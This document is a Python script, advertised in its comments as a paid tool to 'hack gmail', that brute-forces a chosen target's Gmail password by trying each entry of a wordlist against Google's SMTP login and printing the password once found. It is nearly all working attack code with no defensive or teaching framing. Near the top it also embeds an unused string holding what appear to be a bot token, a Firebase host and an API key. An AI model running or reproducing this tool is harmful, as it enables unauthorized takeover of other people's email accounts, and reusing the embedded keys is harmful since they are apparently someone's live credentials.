#this tool for hack gmail accound
#Att pass from list
# cody by rhp silver 
# new tool for my followers
# speed and 60% no false 
# python lang 
# smt login 
# no api 
# no headers 
# not free 
# vip 50$ 


l ="""
5144279583:AAEgc0mLAjoPfTmhBj7reeldFYPn_fa6T_s5144279583:AAEgc0mLAjoPfTmhBj7reeldFYPn_fa6T_s5144279583:AAEgc0mLAjoPfTmhBj7reeldFYPn_fa6T_srhpmoves-83848-default-rtdb.firebaseio.comAIzaSyAsdCtInP1qyqJoVa8yl4y9hBgz3xjaEkA1:97389404065:android:bd02ada918b76e149f75e05160185966ukkkp2125 9603

"""


from colorama import Fore, init
import argparse
import smtplib
from pathlib import Path
import datetime
init(autoreset=False)
def banner(user, wordlist):
    print("rhp silver gmail hacking")
    print("-"*15)
    print(f"""
                    𝙱𝚛𝚞𝚝𝚎 𝙵𝚘𝚛𝚌𝚒𝚗𝚐 𝙶𝚖𝚊𝚒𝚕\n
        START_TIME: {datetime.datetime.ctime(datetime.datetime.now())}
        Target User: {user}
        WORDLIST_FILES: {wordlist.name}
        """)
    print("-"*67)
    print("--> Brute Force Attack Launched <--\n".center(50))


def bruteForce(user, wordlist):

    smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
    smtp_server.ehlo()
    smtp_server.starttls()
    if wordlist:
        wordlist = open(wordlist, "r")
    else:
        wordlist = open("pass.txt", "r")
    banner(user, wordlist)

    for password in wordlist:
        password = password.strip("\n")
        try:
            smtp_server.login(user, password)
            print(Fore.GREEN + "[+] Password Found: " + password)
            break
        except smtplib.SMTPAuthenticationError:
            print(Fore.LIGHTRED_EX + "[-] Wrong Password: " + password)


ap = argparse.ArgumentParser(add_help=False)
ap.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS,
                help="""WordList (-w): Enter your wordlist (use `-w -` for stdin)\n[*] Target User (-u): Must be specified\n-----------\nUsage: python gmail.py -u <user@gmail.com> -w <wordlist>""")
ap.add_argument('-u', '--user', dest='user',
                help="Enter target user mail.")
ap.add_argument('-w', '--wordlist', type=Path, dest='wordlist',
                help="Enter your wordlist.")

args = vars(ap.parse_args())
if args['user']:
    try:
        bruteForce(args['user'], args['wordlist'])
        print(Fore.LIGHTCYAN_EX +
              "[~] End: The processing has been finished. Password Not Found!")
    except FileNotFoundError:
        print(Fore.RED +
              f"[~] Error: -FileNotFoundError- Please check your wordlist path. Wordlist: {args['wordlist']}")
    except KeyboardInterrupt:
        print(Fore.LIGHTCYAN_EX + "\n[~] End: You have pressed ctrl-c button.")
else:
    print(Fore.LIGHTRED_EX +
          """WordList (-w): Enter your wordlist (use `-w -` for stdin)\n[*] Target User (-u): Must be specified\n-----------\nUsage: python gmail.py -u email -w file.txt""")